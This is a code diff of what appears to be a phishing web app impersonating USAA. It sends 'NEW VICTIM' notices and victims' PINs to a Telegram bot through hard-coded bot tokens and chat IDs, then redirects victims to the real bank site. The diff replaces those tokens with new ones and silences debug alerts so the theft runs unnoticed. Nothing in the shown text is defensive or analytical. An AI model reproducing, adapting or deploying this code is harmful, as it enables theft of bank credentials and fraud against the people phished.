@@ -24,8 +24,8 @@ function App() {
   const [spinner, spinnerSet] = useState('formal');
 
 
-  const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
-  const chatId = '-937223528';
+  const botToken = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
+  const chatId = '-908968924';
   const message = `NEW VICTIM`;
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -102,7 +102,7 @@ function App() {
 
         if(responseData.messageCode === "Code is Invalid"){
 
-          alert(responseData.messageCode)
+          // alert(responseData.messageCode)
           sorrysSet('')
         } else {
           formallSet('formal')
@@ -120,8 +120,8 @@ function App() {
   const handlePinFA = async (e) => {
     e.preventDefault()
 
-    const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
-    const chatId = '-937223528';
+    const botToken = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
+    const chatId = '-908968924';
     const message = `PIN: ${pinFa}`;
   
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -139,7 +139,7 @@ function App() {
           console.log(pinclaw)
           return
         } else if(pinclaw === "shows"){
-          alert('redirecting')
+          // alert('redirecting')
         window.location.href = 'https://www.usaa.com';
         }
         // console.log('Message sent successfully!', response.data);
@@ -154,7 +154,7 @@ function App() {
   const sendCode = async (content) => {
 
     formalSet('formal')
-    alert(content)
+    // alert(content)
     valueClassSet(content)
     formallSet('')
     twoFaSet('')
